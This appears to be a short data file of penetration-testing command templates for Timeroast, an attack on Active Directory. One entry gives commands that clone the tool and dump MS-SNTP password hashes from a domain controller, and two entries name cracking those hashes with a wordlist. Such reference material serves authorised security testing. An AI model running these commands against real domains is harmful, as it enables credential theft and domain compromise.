commands.title: Run Timeroast to dump hashes
commands.description: Dump MS-SNTP hashes from the target domain controller.
commands.template:
git clone https://github.com/SecuraBV/Timeroast.git 
cd Timeroast
python3 timeroast.py {domain_controller} -o hashes.txt

commands.title: Crack Timeroast hashes
commands.description: Crack dumped hashes using a wordlist.

commands.title: Timeroast password cracker script
commands.description: Python script to crack MS-SNTP hashes using wordlist or single password.
